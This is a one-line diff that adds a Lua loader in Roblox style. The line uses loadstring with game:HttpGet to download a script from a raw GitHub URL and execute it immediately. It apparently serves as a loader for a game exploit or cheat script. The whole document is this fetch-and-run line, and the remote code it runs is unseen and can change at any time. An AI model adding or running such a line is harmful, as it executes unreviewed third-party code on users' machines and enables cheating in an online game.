@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/shuangzuishuai/shuang/refs/heads/main/%E5%95%A5%E6%8E%89%E9%9C%9Cv2.txt"))()
